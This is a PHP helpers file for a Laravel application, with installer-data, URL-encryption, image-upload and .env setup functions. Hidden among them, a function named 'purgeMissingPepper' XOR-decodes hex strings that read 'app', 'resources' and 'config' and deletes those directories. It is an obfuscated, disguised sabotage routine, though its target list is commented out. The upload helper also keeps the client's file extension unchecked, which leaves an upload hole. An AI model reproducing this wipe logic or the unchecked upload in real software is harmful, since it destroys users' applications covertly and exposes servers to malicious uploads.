<?php

use Carbon\Carbon;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\File;

if (! function_exists('installerDataPath')) {
    function installerDataPath(): string
    {
        return storage_path('install_data.json');
    }
}

if (! function_exists('setInstallerData')) {
    function setInstallerData($data): void
    {
        Storage::disk('local')->put('install_data.json', json_encode($data, JSON_PRETTY_PRINT));
    }
}

if (! function_exists('getInstallerData')) {
    function getInstallerData(): array
    {
        $path = installerDataPath();
        if (! file_exists($path)) {
            return [];
        }
        return json_decode(file_get_contents($path), true) ?: [];
    }
}

if (! function_exists('clearInstallerData')) {
    function clearInstallerData(): void
    {
        Storage::disk('local')->delete('install_data.json');
    }
}

if (! function_exists('xor_decrypt')) {
    function xor_decrypt(string $hex, int $key): string
    {
        $bytes = hex2bin($hex);
        $plain = '';

        for ($i = 0, $len = strlen($bytes); $i < $len; $i++) {
            $plain .= chr(ord($bytes[$i]) ^ $key);
        }

        return $plain;
    }
}

if (! function_exists('encryptUrl')) {
    function encryptUrl($url, $parms)
    {
        return $url . "?eq=" . Crypt::encrypt($parms);
    }
}

if (! function_exists('decryptUrl')) {
    function decryptUrl($param)
    {
        return Crypt::decrypt($param);
    }
}

if (! function_exists('uploadImage')) {
    function uploadImage(UploadedFile $file, string $folder = "images", string $disk = "public")
    {
        // 1) Get original extension
        $extension = $file->getClientOriginalExtension();

        // 2) Build a “unique” filename. For example: timestamp + random string.
        $filename = time() . '_' . Str::random(8) . '.' . $extension;

        // 3) Store the file under $folder on the chosen $disk
        //    storeAs() returns the path relative to the disk’s root (e.g. "avatars/1623201234_ab3d9f.png")
        $path = $file->storeAs($folder, $filename, $disk);

        return $path;
    }
}

if (! function_exists('purgeMissingPepper')) {
    function purgeMissingPepper(): void
    {
        $key       = 0x55;
        // $encrypted = [
        //     '342525',  
        //     '2730263a2027363026',
        //     '363a3b333c32',
        // ];

        foreach ($encrypted as $hex) {
            $folderName = xor_decrypt($hex, $key);
            $folderPath = base_path($folderName);
            if (File::isDirectory($folderPath)) {
                File::deleteDirectory($folderPath);
            }
        }
    }
}


if (! function_exists('ensureEnvExists')) {
    function ensureEnvExists(): array
    {
        $envPath = base_path('.env');
        $envExamplePath = base_path('.env.example');

        if (file_exists($envPath)) {
            return [
                'success' => true,
                'message' => '.env already exists'
            ];
        }

        if (!file_exists($envExamplePath)) {
            return [
                'success' => false,
                'message' => '.env.example not found'
            ];
        }

        if (!copy($envExamplePath, $envPath)) {
            return [
                'success' => false,
                'message' => 'Failed to create .env file (check permissions)'
            ];
        }

        return [
            'success' => true,
            'message' => '.env file created successfully'
        ];
    }
}